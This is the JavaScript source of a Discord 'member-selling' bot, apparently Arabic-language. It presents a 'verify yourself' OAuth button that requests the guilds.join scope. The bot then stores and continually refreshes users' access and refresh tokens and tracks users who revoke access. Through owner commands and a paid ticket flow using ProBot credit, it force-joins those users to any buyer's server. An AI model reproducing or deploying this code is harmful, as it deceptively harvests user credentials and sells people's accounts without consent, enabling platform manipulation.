const { Intents  , Client , MessageActionRow, MessagePayload  , MessageSelectMenu ,Modal , MessageEmbed  ,MessageButton , MessageAttachment, Permissions, TextInputComponent   } = require('discord.js');
const client = new Client({
  intents: [
    Intents.FLAGS.GUILDS,
    Intents.FLAGS.GUILD_MESSAGES
  ]
});

var express = require("express");
var app = express();
var path = require("path");
var bodyParser = require("body-parser");
const Database = require('st.db')
const usersdata = new Database({
  path: './database/users.json',
  databaseInObject: true
})
const DiscordStrategy = require('passport-discord').Strategy
  , refresh = require('passport-oauth2-refresh');
const passport = require('passport');
const session = require('express-session');
const wait = require('node:timers/promises').setTimeout;
const { channels, bot, website } = require("./config.js");
app.use(bodyParser.urlencoded({ extended: true }));
app.set("views", path.join(__dirname, "/views"));
app.use(express.static(__dirname + "assets"))
app.set("view engine", "ejs")
app.use(express.static("public"));
const config = require('./config.js');

const { use } = require("passport");
global.config = config;
import('node-fetch')
const DiscordOauth2 = require("discord-oauth2");
const oauth = new DiscordOauth2({
  clientId: config.bot.botID,
  clientSecret: config.bot.clientSECRET,
  redirectUri: config.bot.callbackURL,
});

require('./slash.js')
app.get('/', function (req, res) {
  res.send('Hello World')
})
const prefix = config.bot.prefix; 
app.listen(1000)
var scopes = ['identify', 'guilds', 'guilds.join'];

passport.use(new DiscordStrategy({
  clientID: config.bot.botID,
  clientSecret: config.bot.clientSECRET,
  callbackURL: config.bot.callbackURL,
  scope: scopes
}, async function (accessToken, refreshToken, profile, done) {
  process.nextTick(async function () {
    usersdata.set(`${profile.id}`, {
      accessToken: accessToken,
      refreshToken: refreshToken,
      email: profile.email
    })
    return done(null, profile);
  });
  await oauth.addMember({
    guildId: `${config.bot.GuildId}`,
    userId: profile.id,
    accessToken: accessToken,
    botToken: client.token
  })
const channel = await client.channels.fetch(config.Log.LogChannelOwners); // استبدل بـ ID القناة التي تريد إرسال الرسالة إليها
  if (channel) {
    const embed = new MessageEmbed()
      .setColor('#7adfdb')
      .setTitle('لقد قام شخص بإثبات نفسه')
      .setDescription(`<@${profile.id}>, لقد تم توثيقك بنجاح`)
      .addField('اسم المستخدم', profile.username, true)
      .addField('ID المستخدم', profile.id, true)
      .setTimestamp();

    channel.send({ embeds: [embed] });
    channel.send({content: `${config.bot.LineIce}`})
  } else {
    console.error('القناة غير موجودة.');
  }

  return done(null, profile);
}));



app.get("/", function (req, res) {
  res.render("index", { client: client, user: req.user, config: config, bot: bot });
});



app.use(session({
  secret: 'some random secret',
  cookie: {
    maxAge: 60000 * 60 * 24
  },
  saveUninitialized: false
}));
app.get("/", (req, res) => {
  res.render("index", { client: client, user: req.user, config: config, bot: bot });
});
passport.serializeUser(function (user, done) {
  done(null, user);
});
passport.deserializeUser(function (user, done) {
  done(null, user);
});
app.use(passport.initialize());
app.use(passport.session());

app.get('/login', passport.authenticate('discord', { failureRedirect: '/' }), function (req, res) {
  var characters = '0123456789';
  let idt = ``
  for (let i = 0; i < 20; i++) {
    idt += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  res.render("login", { client: client, user: req.user.username, config: config, bot: bot });
});

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag} Online`);
    client.user.setStatus('idle'); // تعيين الحالة إلى online

    var statuses = [`Start Members Up`, `discord.gg/start-h`, `الأفضل لخدمتك`,`ثقة و ضمان`];
    var timers = 5;
    var timeing = timers * 1500;
    setInterval(function () {
        var lengthesof = statuses.length;
        var amounter = Math.floor(Math.random() * lengthesof);
        client.user.setPresence({
            activities: [{ name: statuses[amounter] }],
            status: 'idle'
        });
    }, timeing);
});


client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `send`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }

    
    let button = new MessageButton()
      .setLabel('اثبت نفسك')
      .setStyle('LINK')
      .setURL(`${config.bot.TheLinkVerfy}`)
      .setEmoji('')

    let row = new MessageActionRow()
      .setComponents(button)

    // إرسال الرسالة مع الـ Embed والأزرار
    message.channel.send({ components: [row] });
  }
});

// كود التحقق من Deauthorize باستخدام Refresh Token
async function checkAuthorization() {
  const users = usersdata.all(); // الحصول على جميع المستخدمين
  for (const user of users) {
    try {
      const refreshedToken = await oauth.tokenRequest({
        refreshToken: user.refreshToken,
        grantType: "refresh_token",
        clientId: config.bot.botID,
        clientSecret: config.bot.clientSECRET,
      });

      // تحديث الـ Access Token في قاعدة البيانات
      usersdata.set(`${user.key}.accessToken`, refreshedToken.access_token);
    } catch (error) {
      if (error.message.includes("invalid_grant")) {
        // إذا كانت المشكلة بسبب إزالة التوثيق (Deauthorize)
        const channel = await client.channels.fetch('1288860717805469730'); // استبدل بـ ID القناة
        if (channel) {
          const embed = new MessageEmbed()
            .setColor('#ff0000')
            .setTitle('إزالة التوثيق')
            .setDescription(`قام المستخدم <@${user.key}> بإزالة التوثيق من حسابه.`)
            .setTimestamp();

          channel.send({ embeds: [embed] });
        }
      } else {
        console.error('Error refreshing token:', error);
      }
    }
  }
}

// التحقق من إزالة التوثيق كل 10 دقائق
setInterval(checkAuthorization, 10 * 60 * 1000);



client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `invite`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let button = new MessageButton()
      .setLabel(`ضيفني`)
      .setStyle(`LINK`)
      .setURL(config.bot.inviteBotUrl)
      .setEmoji(`✍️`)

    let row = new MessageActionRow()
      .setComponents(button)
    message.channel.send({ components: [row] })
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `check`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let args = message.content.split(" ").slice(1).join(" ");
    if (!args) return message.channel.send({ content: `**منشن شخص طيب**` });
    let member = message.mentions.members.first() || message.guild.members.cache.get(args.split(` `)[0]);
    if (!member) return message.channel.send({ content: `**شخص غلط**` });
    let data = usersdata.get(`${member.id}`)
    if (data) return message.channel.send({ content: `**موثق بالفعل**` });
    if (!data) return message.channel.send({ content: `**غير موثق**` });
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `join`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let msg = await message.channel.send({ content: `**جاري الفحص ..**` })
    let alld = usersdata.all()
    let args = message.content.split(` `).slice(1)
    if (!args[0] || !args[1]) return msg.edit({ content: `**عذرًا , يرجى تحديد خادم ..**` }).catch(() => { message.channel.send({ content: `**عذرًا , يرجى تحديد خادم ..**` }) });
    let guild = client.guilds.cache.get(`${args[0]}`)
    let amount = args[1]
    let count = 0
    if (!guild) return msg.edit({ content: `**عذرًا , لم اتمكن من العثور على الخادم ..**` }).catch(() => { message.channel.send({ content: `**عذرًا , لم اتمكن من العثور على الخادم ..**` }) });
    if (amount > alld.length) return msg.edit({ content: `**لا يمكنك ادخال هاذا العدد ..**` }).catch(() => { message.channel.send({ content: `**لا يمكنك ادخال هاذا العدد ..**` }) });;
    for (let index = 0; index < amount; index++) {
      await oauth.addMember({
        guildId: guild.id,
        userId: alld[index].ID,
        accessToken: alld[index].data.accessToken,
        botToken: client.token
      }).then(() => {
        count++
      }).catch(() => { })
    }
    msg.edit({
      content: `**تم بنجاح ..**
**تم ادخال** \`${count}\`
**لم اتمكن من ادخال** \`${amount - count}\`
**تم طلب** \`${amount}\``
    }).catch(() => {
      message.channel.send({
        content: `**تم بنجاح ..**
**تم ادخال** \`${count}\`
**لم اتمكن من ادخال** \`${amount - count}\`
**تم طلب** \`${amount}\``
      })
    });;
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `refresh`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let mm = await message.channel.send({ content: `**جاري عمل ريفريش ..**` }).catch(() => { })
    let alld = usersdata.all()
    var count = 0;

    for (let i = 0; i < alld.length; i++) {
      await oauth.tokenRequest({
        'clientId': client.user.id,
        'clientSecret': bot.clientSECRET,
        'grantType': 'refresh_token',
        'refreshToken': alld[i].data.refreshToken
      }).then((res) => {
        usersdata.set(`${alld[i].ID}`, {
          accessToken: res.access_token,
          refreshToken: res.refresh_token
        })
        count++
      }).catch(() => {
        usersdata.delete(`${alld[i].ID}`)
      })
    }

    mm.edit({
      content: `**تم بنجاح ..**
**تم تغير** \`${count}\`
**تم حذف** \`${alld.length - count}\``
    }).catch(() => {
      message.channel.send({ content: `**تم بنجاح .. ${count}**` }).catch(() => { })
    })
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + 'stock')) {
    // التأكد من أن المستخدم لديه الصلاحية لتنفيذ الأمر
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }

    const guildIcon = message.guild.iconURL(); // صورة الخادم
    const botName = client.user.username; // اسم البوت
    const botAvatar = client.user.displayAvatarURL(); // صورة البوت

    // جلب بيانات المستخدمين
    let alld = usersdata.all();

    // إنشاء الـ Embed
    const embed = new MessageEmbed()
      .setColor(config.bot.colorembed)
      .setTitle('كمية الأعضاء المتوفرة حاليا')
      .setDescription(`يوجد حاليًا **${alld.length}** عضو.`)
      .setImage('https://cdn.discordapp.com/attachments/1278453203792298115/1292033637872697344/image4.png?ex=67024398&is=6700f218&hm=9b50426ec60c7f2f5fa41e60ff734f2918722e601fed25bdd3de6e4f56869bb9&')
      .setThumbnail(guildIcon) // تعيين صورة الخادم
      .setTimestamp()
      .setFooter({ text: botName, iconURL: botAvatar });

    // إنشاء زر Refresh
    const row = new MessageActionRow().addComponents(
      new MessageButton()
        .setCustomId('refresh_users')
        .setEmoji('🔄')
        .setStyle('SECONDARY')
    );

    // إرسال رسالة الـ Embed مع الزر إلى القناة
    await message.channel.send({ embeds: [embed], components: [row] });
  }
});

// الاستماع للتفاعل مع الزر (Interaction)
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;

  // التحقق من زر الـ Refresh
  if (interaction.customId === 'refresh_users') {
      
    const guildIcon = interaction.guild.iconURL(); // صورة الخادم
    const botName = client.user.username; // اسم البوت
    const botAvatar = client.user.displayAvatarURL(); 
    // جلب بيانات المستخدمين
    let alld = usersdata.all();

    // تحديث الـ Embed
    const updatedEmbed = new MessageEmbed()
      .setColor(config.bot.colorembed)
      .setTitle('كمية الأعضاء المتوفرة حاليا')
      .setDescription(`يوجد حاليًا **${alld.length}** عضو.`)
      .setImage('https://cdn.discordapp.com/attachments/1278453203792298115/1292033637872697344/image4.png?ex=67024398&is=6700f218&hm=9b50426ec60c7f2f5fa41e60ff734f2918722e601fed25bdd3de6e4f56869bb9&')
      .setThumbnail(guildIcon) // تعيين صورة الخادم
      .setTimestamp()
      .setFooter({ text: botName, iconURL: botAvatar });

    // تحديث الرسالة الأصلية بالـ Embed الجديد
    await interaction.update({ embeds: [updatedEmbed], components: interaction.message.components });
  }
});




client.on('messageCreate', async (message) => {
  // تحقق من أن الرسالة ليست من البوت
  if (message.author.bot) return;

  // تغيير اسم البوت
  if (message.content.startsWith(`${prefix}setname`)) {
      
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    const newName = message.content.split(' ').slice(1).join(' ');
    if (!newName) return message.reply('يرجى تقديم اسم جديد للبوت.');

    try {
      await client.user.setUsername(newName);
      message.channel.send(`تم تغيير اسم البوت إلى: ${newName}`);
    } catch (error) {
      console.error(error);
      message.channel.send('حدث خطأ أثناء محاولة تغيير اسم البوت.');
    }
  }

  // تغيير صورة البوت
  if (message.content.startsWith(`${prefix}setavatar`)) {
      
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    const newAvatarUrl = message.content.split(' ')[1];
    if (!newAvatarUrl) return message.reply('يرجى تقديم رابط صورة جديد للبوت.');

    try {
      await client.user.setAvatar(newAvatarUrl);
      message.channel.send('تم تغيير صورة البوت بنجاح.');
    } catch (error) {
      console.error(error);
      message.channel.send('حدث خطأ أثناء محاولة تغيير صورة البوت.');
    }
  }
});




client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + 'help')) {
    // التحقق من أن المستخدم لديه الصلاحية للوصول إلى هذه القائمة
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }

    // إنشاء Embed لقائمة المساعدة العامة
    const generalEmbed = new MessageEmbed()
      .setColor(config.bot.colorembed)
      .setTitle('📋 قائمة المساعدة - General')
      .setDescription(`
**[\`${prefix}stock\`]** - عرض مخزون اعضاء 
**[\`${prefix}help\`]** - عرض قائمة المساعدة
**[\`${prefix}invite\`]** - دعوة البوت
**[\`${prefix}tax\`]** - حساب ضريبة بروبوت

`)
      .setFooter({ text: `${client.user.username}`, iconURL: client.user.displayAvatarURL() });

    // إنشاء الأزرار
    const row = new MessageActionRow().addComponents(
      new MessageButton()
        .setCustomId('general')
        .setLabel('General')
        .setStyle('SECONDARY'),
      
      new MessageButton()
        .setCustomId('owners')
        .setLabel('Owners')
        .setStyle('SECONDARY'),

      new MessageButton()
        .setLabel('دعوة البوت')
        .setStyle('LINK')
        .setURL(`https://discord.com/api/oauth2/authorize?client_id=${config.bot.ClientId}&permissions=8&scope=bot`)
    );

    // إرسال الرسالة مع الـ Embed والأزرار
    await message.reply({ embeds: [generalEmbed], components: [row] });
  }
});

// الاستماع للتفاعل مع الأزرار (Interaction)
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;

  // التعامل مع زر General
  if (interaction.customId === 'general') {
    const generalEmbed = new MessageEmbed()
      .setColor(config.bot.colorembed)
      .setTitle('📋 قائمة المساعدة - General')
      .setDescription(`**[\`${prefix}stock\`]** - عرض عدد المستخدمين
        **[\`${prefix}help\`]** - عرض قائمة المساعدة
        **[\`${prefix}invite\`]** - دعوة البوت
        **[\`${prefix}tax\`]** - حساب ضريبة بروبوت
`)
      .setFooter({ text: `${client.user.username}`, iconURL: client.user.displayAvatarURL() });

    await interaction.update({ embeds: [generalEmbed], components: interaction.message.components });
  }

  // التعامل مع زر Owners
  if (interaction.customId === 'owners') {
    if (!config.bot.owners.includes(`${interaction.user.id}`)) {
      // رد مخفي يظهر أن المستخدم ليس لديه الصلاحية
      return interaction.reply({ content: '❌ ليس لديك صلاحية الوصول إلى قائمة الأوامر هذه.', ephemeral: true });
    }

    const ownersEmbed = new MessageEmbed()
      .setColor(config.bot.colorembed)
      .setTitle('🔑 قائمة المساعدة - Owners')
      .setDescription(`

        **[\`${prefix}join {ServerId} {amount}\`]** - الانضمام إلى سيرفر
        **[\`${prefix}refresh\`]** - تحديث المعلومات
        **[\`${prefix}check\`]** - التحقق من حالة معينة
        **[\`${prefix}send\`]** - إرسال رسالة
      
`)
      .setFooter({ text: `${client.user.username}`, iconURL: client.user.displayAvatarURL() });

    await interaction.update({ embeds: [ownersEmbed], components: interaction.message.components });
  }
});
var listeners = app.listen(`${config.website.PORT}`, function () {
  console.log("Your app is listening on port " + `${config.website.PORT}`)
});

client.on('ready', () => {
  console.log(`Bot is On! ${client.user.tag}`);
});
client.login(config.bot.TOKEN);
const { AutoKill } = require('autokill')
AutoKill({ Client: client, Time: 5000 })

process.on("unhandledRejection", error => {
  console.log(error)
});


client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;

  console.log('تم استدعاء الأمر');

  if (interaction.commandName === 'setup') {

    if (!config.bot.owners.includes(`${interaction.user.id}`)) {  // تأكد من أن المستخدم المصرح له
      return;
    }
    console.log('الأمر setup تم استدعاؤه');
  
    const ChannelID = "1314240500529631262"; // معرف القناة
  
    const embed = new MessageEmbed()
      .setAuthor({ name: `${interaction.guild.name}`, iconURL: interaction.guild.iconURL() || '' })
      .setTitle('خدمة بيع أعضاء حقيقية')
      .setDescription('* لشراء أعضاء حقيقية يرجى فتح تذكرة')
      .setColor(config.bot.colorembed)
      .setImage('https://cdn.discordapp.com/attachments/1278453203792298115/1292033638652842117/image2.png?ex=67024398&is=6700f218&hm=eec1fecc26cdce44ec1b4c7bd2f4c0d365ea695f82b4f16df1b683f487436bc1&')
      .setThumbnail(interaction.guild.iconURL() || '')
      .setTimestamp()
      .setFooter({ text: `${interaction.user.username}`, iconURL: interaction.user.displayAvatarURL() || '' });
  
    const row = new MessageActionRow().addComponents(
      new MessageButton()
        .setCustomId('openticket')
        .setLabel('إشتري الأن')
        .setEmoji('🛒') // استخدم رمز تعبيري صحيح
        .setStyle('SECONDARY')
    );
  
    try {
      const channel = interaction.guild.channels.cache.get(ChannelID); // احصل على القناة باستخدام المعرف
      if (channel) {
        await channel.send({ embeds: [embed], components: [row] });
        console.log('تم إرسال الرسالة بنجاح');
      } else {
        console.error('القناة غير موجودة');
      }
    } catch (error) {
      console.error('حدث خطأ أثناء إرسال الرسالة:', error);
    }
  
    await interaction.reply({ content: '**تم إرسال بانل الشراء بنجاح ✅**', ephemeral: true });
  }
})

client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return; 
  if (interaction.customId == 'openticket') {
    
    // التحقق من أن الفئة (Category) موجودة
    const category = await interaction.guild.channels.cache.get(config.bot.ceatogry);
    if (!category || category.type !== 'GUILD_CATEGORY') {
      return interaction.reply({ content: 'لم يتم العثور على الفئة المحددة.', ephemeral: true });
    }

    // إنشاء قناة جديدة في الفئة المحددة
    const ChannelSpin = await interaction.guild.channels.create(`${interaction.user.username}`, {
      type: 'GUILD_TEXT',
      parent: config.bot.ceatogry, // الفئة المحددة
      permissionOverwrites: [
        {
          id: interaction.guild.roles.everyone.id,
          deny: ['VIEW_CHANNEL'],
        },
        {
          id: interaction.user.id,
          allow: ['VIEW_CHANNEL'],
        },
      ],
    });

const chiratlgaiembed = new MessageEmbed().setImage('https://cdn.discordapp.com/attachments/1288860717805469730/1288945374253416458/156_20240926222739.png');
      
    const row = new MessageActionRow().addComponents(
      new MessageButton()
        .setCustomId('buyMembers')
        .setLabel('شراء أعضاء')
        .setEmoji('<:member_haland1:1283575163379646556>')
        .setStyle('SECONDARY'),
      
      new MessageButton()
        .setCustomId('HowToBuy')
        .setLabel('🤔')
        .setStyle('PRIMARY'),

      new MessageButton()
        .setCustomId('closeTicket')
        .setLabel('إغلاق التذكرة')
        .setEmoji('<:delete:1266691692371640320>')
        .setStyle('DANGER'),

      new MessageButton()
        .setLabel('دعوة البوت')
        .setStyle('LINK')
        .setURL(`https://discord.com/api/oauth2/authorize?client_id=${config.bot.ClientId}&permissions=8&scope=bot`)
        .setEmoji('<:websiteWick:1287207367624364052>')
    );

    // إرسال الرسالة في القناة الجديدة
   await ChannelSpin.send({ 
  content: `* **${interaction.user} مرحبا بك 👋**\n\n
  **هذه تذكرة شراء الخاصة بك سأوضح لك كيف تشتري**\n\n
  * 1. أولا يجب عليك إضافة البوت من زر \`إضافة البوت\` أسفله \n
  * 2. ثانيا اذهب إلى إعدادات حسابك في خيار \`Advance\` قم بتفعيل \`Developer Mode\` \n
  * 3. قم بنسخ إيدي سيرفرك ثم عد إلى التذكرة و اضغط زر \`شراء أعضاء\` في خانة أولى أدخل الكمية و في خانة ثانية أدخل إيدي سيرفر\n
  ثم اضغط \`Submit\`.\n
  سيقوم البوت بإرسال رسالة لكي تنسخ أمر التحويل وتقوم بالتحويل.\n
  ثم بعد ذلك سيقوم البوت بنظام تلقائي في إدخال الأعضاء إلى خادمك.\n\n
  * **⚠️ ملاحظات مهمة:**\n
  \`-\` يرجى العلم أن التحويل خارج التذكرة يعتبر خطأ ولن يتم تعويضك.\n
  \`-\` التحويل لشخص آخر خطأ منك وأنت تتحمل المسؤولية وليس لنا أي علاقة بك.\n
  \`-\` إذا قمت بالتحويل قبل أن تقوم بإضافة البوت فليس لنا علاقة بك.\n\n
  عند انتهائك من الخدمة لا تنسى تقييمنا فنحن دائمًا نقدم الأفضل 🫡
  <@&1312169929658732655>`,
  components: [row] 
});


    // الرد على المستخدم برسالة مخفية (ephemeral)
    await interaction.reply({ content: `**تم إنشاء تذكرتك بنجاح ✅**`, ephemeral: true });
  }
});



client.on(`interactionCreate`,async interaction => {
  if (!interaction.isButton())return ; 
  if (interaction.customId == 'buyMembers'){

    const BuyModal = new Modal()
    .setCustomId('BuyModal')
    .setTitle('شراء اعضاء');
  const Count = new TextInputComponent()
    .setCustomId('Count')
    .setLabel("الكمية")
    .setMinLength(1)
    .setMaxLength(5)
    .setStyle('SHORT'); 
    
    const serverid = new TextInputComponent()
    .setCustomId('serverid')
    .setLabel("ايدي سيرفرك")
    .setMinLength(1)
    .setMaxLength(22)
    .setStyle('SHORT'); 


  const firstActionRow = new MessageActionRow().addComponents(Count);
  const firstActionRow2 = new MessageActionRow().addComponents(serverid);


  BuyModal.addComponents(firstActionRow , firstActionRow2);

  await interaction.showModal(BuyModal);


  } else if (interaction.customId == 'closeTicket'){

    interaction.reply(`سيتم حذف التذكرة بعد قليل`)
   setTimeout(() => {
  interaction.channel.delete();
}, 5000);

    
  } else if (interaction.customId == 'HowToBuy'){
    await interaction.reply({ content: `** كيفية شراء؟**`, ephemeral: true });
 }
})




client.on(`interactionCreate`, async interaction => {
  if (!interaction.isModalSubmit()) return;

  if (interaction.customId == 'BuyModal') {
    const Count = interaction.fields.getTextInputValue('Count');
    const serverid = interaction.fields.getTextInputValue('serverid');
    const price = config.bot.Price;

    const result = Count * price;
    const tax = Math.floor(result * (20 / 19) + 1);

    let alld = usersdata.all();
    let guild = client.guilds.cache.get(`${serverid}`);
    let amount = Count;
    let count = 0;

    if (!guild) {
      return interaction.reply({ content: `**عذرًا , لم اتمكن من العثور على الخادم ..**` });
    }

    if (amount > alld.length) {
      return interaction.reply({ content: `**لا يمكنك ادخال هذا العدد ..**` });
    }

    await interaction.reply({ content: `#credit ${config.bot.TraId} ${tax}` });

    const filter = ({ content, author: { id } }) => {
      return (
        content.startsWith(`**:moneybag: | ${interaction.user.username}, has transferred `) &&
        content.includes(config.bot.TraId) &&
        id === "282859044593598464" &&
        (Number(content.slice(content.lastIndexOf("`") - String(tax).length, content.lastIndexOf("`"))) >= result)
      );
    };

    const collector = interaction.channel.createMessageCollector({
      filter,
      max: 1,
    });

    collector.on('collect', async collected => {
      console.log(`Collected message: ${collected.content}`);
      await interaction.deleteReply();

      let msg = await interaction.channel.send({ content: `**جاري الفحص ..**` });

      for (let index = 0; index < amount; index++) {
        await oauth.addMember({
          guildId: guild.id,
          userId: alld[index].ID,
          accessToken: alld[index].data.accessToken,
          botToken: client.token
        }).then(() => {
          count++;
        }).catch(err => {
          console.error(`Error adding member: ${err}`);
        });
      }

      msg.edit({
        content: `**تم بنجاح ..**
  **✅  تم ادخال** \`${count}\`
  **❌ لم اتمكن من ادخال** \`${amount - count}\`
  **📡 تم طلب** \`${amount}\``
      });

      // إرسال رسالة إلى القناة المحددة
      const channelId = config.bot.channelId; 
      const logChannel = client.channels.cache.get(channelId);

      const embed = new MessageEmbed()
        .setTitle('تم شراء أعضاء')
        .setDescription(`**العميل:** ${interaction.user}\n**عدد الأعضاء:** ${amount}`)
        .setColor(config.bot.colorembed)
        .setTimestamp();

      if (logChannel) {
        logChannel.send({ embeds: [embed] });
        logChannel.send({content:`${config.bot.LineIce}`})
      } else {
        console.log(`القناة بمعرف ${channelId} غير موجودة.`);
      }

      // إعطاء العميل رتبة معينة
      const roleId = config.bot.roleId; 
      const member = await guild.members.fetch(interaction.user.id).catch(err => {
        console.log(`لم أتمكن من إيجاد العضو ${interaction.user.id}: ${err}`);
      });

      if (member) {
        member.roles.add(roleId).catch(console.error);
      }
    });

    // معالجة أي أخطاء في المجمّع
    collector.on('end', collected => {
      if (collected.size === 0) {
        console.log("لم يتم جمع أي رسائل.");
      }
    });
  }
});



client.on('messageCreate', async (message) => {
  if (message.author.bot || !config.bot.taxchannels.includes(message.channelId)) return;

  // التحقق مما إذا كانت الرسالة تحتوي على رقم بصيغة 1k, 1m, 1b, 1B, 1M, 1K
  const regex = /^(\d+)([kKmMbB])?$/;
  const match = message.content.match(regex);

  if (!match) return;

  let number = parseInt(match[1]);
  const suffix = match[2] ? match[2].toLowerCase() : '';

  // تحويل القيم بناءً على اللاحقة
  switch (suffix) {
    case 'k':
      number *= 1000;
      break;
    case 'm':
      number *= 1000000;
      break;
    case 'b':
      number *= 1000000000;
      break;
  }

  try {
    const tax = parseInt(number / 0.95 + 1);
    const tax2 = parseInt(tax / 0.95 + 1);
    const rate = parseInt(number * 0.02);

    const embed = new MessageEmbed()
      .setColor(config.bot.colorembed)
      .setThumbnail(message.author.displayAvatarURL({ dynamic: true })) // صورة العضو
      .setDescription(`
        ** 
        > المبلغ كامل : \`${number}\`
        >  المبلغ مع ضريبة بروبوت : \`${tax}\`
        >  المبلغ كامل مع ضريبة الوسيط : \`${tax2}\`
        >  نسبة الوسيط 2% : \`${rate}\`
        >  المبلغ كامل مع ضريبة بروبوت و الوسيط : \`${tax2 + rate}\`
        **`)
      .setFooter({ text: message.author.username, iconURL: message.author.displayAvatarURL({ dynamic: true }) }) // اسم العضو وصورته
      .setTimestamp();

    // إرسال الرسالة بالـ embed
    await message.channel.send({ embeds: [embed] });
    await message.channel.send({content:`${config.bot.LineIce}`})

    // مسح الرسالة الأصلية
    await message.delete();

  } catch (error) {
    console.error(error);
  }
});

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  // التحقق من أن الرسالة تبدأ بالأمر ${prefix}tax
  if (message.content.startsWith(`${prefix}tax`)) {
    // فصل الأمر عن الرقم
    const args = message.content.split(' ').slice(1).join(' '); // استخراج الرقم بعد ${prefix}tax

    // التحقق من أن المستخدم أدخل رقمًا
    const regex = /^(\d+)([kKmMbB])?$/;
    const match = args.match(regex);

    if (!match) {
      return message.reply('الرجاء إدخال رقم صالح مثل 1K أو 1M أو 1B ❗');
    }

    let number = parseInt(match[1]);
    const suffix = match[2] ? match[2].toLowerCase() : '';

    // تحويل القيم بناءً على اللاحقة
    switch (suffix) {
      case 'k':
        number *= 1000;
        break;
      case 'm':
        number *= 1000000;
        break;
      case 'b':
        number *= 1000000000;
        break;
    }

    try {
      const tax = parseInt(number / 0.95 + 1);
      const tax2 = parseInt(tax / 0.95 + 1);
      const rate = parseInt(number * 0.02);

      const embed = new MessageEmbed()
        .setColor(config.bot.colorembed)
        .setThumbnail(message.author.displayAvatarURL({ dynamic: true })) // صورة العضو
        .setDescription(`
          ** 
          > المبلغ كامل : \`${number}\`
          >  المبلغ مع ضريبة بروبوت : \`${tax}\`
          >  المبلغ كامل مع ضريبة الوسيط : \`${tax2}\`
          >  نسبة الوسيط 2% : \`${rate}\`
          >  المبلغ كامل مع ضريبة بروبوت و الوسيط : \`${tax2 + rate}\`
          **`)
        .setFooter({ text: message.author.username, iconURL: message.author.displayAvatarURL({ dynamic: true }) }) // اسم العضو وصورته
        .setTimestamp();

      // إرسال الرسالة بالـ embed
      await message.channel.send({ embeds: [embed] });

      // مسح الرسالة الأصلية

    } catch (error) {
      console.error(error);
    }
  }
});



client.on('messageCreate', async message => {
    // تحقق من أن الرسالة ليست من بوت
    if (message.author.bot) return;

    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }

    // تحقق من محتوى الرسالة
    if (message.content.toLowerCase() === 'خط') {
        // حذف الرسالة الأصلية
        await message.delete();

        // الرد برسالة جديدة
        await message.channel.send(config.bot.LineIce);
    }
});



const { joinVoiceChannel } = require('@discordjs/voice');
client.on('ready', () => {

  setInterval(async () => {
    client.channels.fetch(config.bot.VoiceChannelId)
      .then((channel) => {
        const VoiceConnection = joinVoiceChannel({
          channelId: channel.id,
          guildId: channel.guild.id,
          adapterCreator: channel.guild.voiceAdapterCreator
        });
      }).catch((error) => { return; });
  }, 1000)
});

